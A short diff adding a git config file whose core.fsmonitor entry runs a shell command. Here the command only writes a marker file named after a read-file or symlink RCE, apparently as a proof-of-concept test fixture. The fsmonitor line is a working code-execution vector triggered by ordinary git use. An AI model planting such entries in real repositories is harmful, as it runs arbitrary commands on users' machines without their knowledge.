@@ -1,0 +1,6 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	fsmonitor = sh -c 'printf GH_READ_FILE_PARENT_SYMLINK_RCE > no_01-read-file-rce-marker.txt'
